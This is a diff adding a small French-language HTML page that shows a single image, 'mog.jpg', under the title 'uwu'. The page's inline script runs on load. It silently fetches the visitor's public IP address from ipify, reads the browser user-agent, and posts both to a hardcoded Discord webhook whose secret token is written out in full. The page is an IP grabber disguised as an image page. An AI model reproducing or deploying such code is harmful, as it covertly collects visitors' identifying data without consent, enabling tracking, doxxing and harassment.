@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>uwu</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <img src="mog.jpg" alt="Image">
+    <script>
+        async function fetchIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Erreur lors de la récupération de l\'adresse IP:', error);
+            }
+        }
+
+        function getUserAgent() {
+            return navigator.userAgent;
+        }
+
+        async function sendToDiscordWebhook(ip, userAgent) {
+            const webhookURL = 'https://discord.com/api/webhooks/1440972996503273515/XAfDYsyyMO0ddmp3SwhMDwSyuaTqstVYmC1gnMaPxFLZFwxJLuNbi71nQA-gCBoBtdp4';
+            const payload = {
+                content: `Adresse IP: ${ip}\nUser-Agent: ${userAgent}`
+            };
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                if (!response.ok) {
+                    throw new Error('Erreur lors de l\'envoi du webhook');
+                }
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi du webhook:', error);
+            }
+        }
+
+        async function main() {
+            const ip = await fetchIP();
+            const userAgent = getUserAgent();
+            await sendToDiscordWebhook(ip, userAgent);
+        }
+
+        main();
+    </script>
+</body>
+</html>
